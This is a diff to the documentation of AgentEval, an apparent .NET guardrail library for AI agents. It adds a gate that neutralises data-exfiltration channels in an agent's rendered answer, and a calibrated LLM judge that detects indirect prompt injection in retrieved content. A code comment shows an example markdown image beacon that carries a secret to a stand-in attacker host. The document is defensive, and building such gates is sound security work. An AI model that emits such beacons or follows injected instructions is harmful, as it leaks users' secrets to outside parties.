@@ -70,6 +70,49 @@ var agent = baseAgent.AsBuilder()
     .Build();
 ```
 
+## Sanitize the rendered answer
+
+`DomainAllowListGate` guards tool-argument URLs; this guards the **rendered answer**, where a client silently GETs
+a markdown image beacon (the secret rides in the URL) with no tool call at all. Register it run-post.
+
+```csharp
+var agent = baseAgent.AsBuilder()
+    .UseAgentEvalGate(post: [new RenderedOutputExfilGate()], policy: EvalGatePolicy.Redact)
+    .Build();
+// A ![beacon](https://attacker/?d=SECRET), fetching <img>, data: URI, or zero-width channel in the answer
+// is neutralized before the client renders it.
+```
+
+## The Tribunal — a judge that *earns* the right to block
+
+For the axis a keyword list can't catch — **indirect prompt injection** (retrieved content trying to instruct the
+agent) — a single-axis LLM judge. But an un-calibrated inline judge is a fabrication risk, so it must beat a
+baseline on a both-directions gold set **before** it blocks live traffic.
+
+```csharp
+using AgentEval.Guardrails.Judges;
+using AgentEval.Guardrails.Judges.Rubrics;
+
+// A single-axis judge backed by a fast (mini/nano) model.
+var judge = new CompositeJudgeGate<IndirectInjectionRubric>(new IndirectInjectionRubric(), fastModel);
+
+// THE BAR: score it against a both-directions gold set (extend the starter with your own data).
+var report = await GateCalibrationHarness.EvaluateAsync(
+    judge, IndirectInjectionRubric.StarterGoldSet(),
+    new CalibrationOptions { MaxDangerousErrors = 0 });   // no missed attacks allowed
+
+report.AssertInlineReady();   // throws unless it earned the right — keep it in shadow until it passes
+
+// Only now register it inline (run-pre, on the tool/RAG-return seam):
+var agent = baseAgent.AsBuilder()
+    .UseAgentEvalGate(pre: [judge], policy: EvalGatePolicy.ThrowOnFail)
+    .Build();
+```
+
+Compose several single-axis judges with `ParallelJudgeFanOut` (they run concurrently, fail-closed OR) and wrap any
+of them in `JudgeVerdictCache` so identical content isn't re-judged. Runnable: sample
+**`Gatekeeper/04_GatekeeperBeachhead`**.
+
 ## The honeypot — detect a compromised agent
 
 A canary is a lure the agent has **no legitimate reason to touch**. Advertise it as a real tool; the model
@@ -159,6 +202,10 @@ model, so every outcome is deterministic and needs no API key:
   read‑customer‑data → external‑POST *sequence* is blocked by `SequenceGate` (no tool‑list trick catches this).
 - [`Gatekeeper/03_GatekeeperToolApproval`](../../samples/AgentEval.Samples/Gatekeeper/03_GatekeeperToolApproval.cs) —
   **human‑in‑the‑loop approval**: a routine refund auto‑approves, a large one pauses for a human and resumes.
+- [`Gatekeeper/04_GatekeeperBeachhead`](../../samples/AgentEval.Samples/Gatekeeper/04_GatekeeperBeachhead.cs) — the
+  **beachhead + the Tribunal**: `RunBudgetGate` (denial‑of‑wallet), `DomainAllowListGate` (exfil),
+  `RenderedOutputExfilGate` (rendered‑output beacon), and a **calibrated** indirect‑injection judge that earns the
+  right to block.
 
 ## From the CLI
 
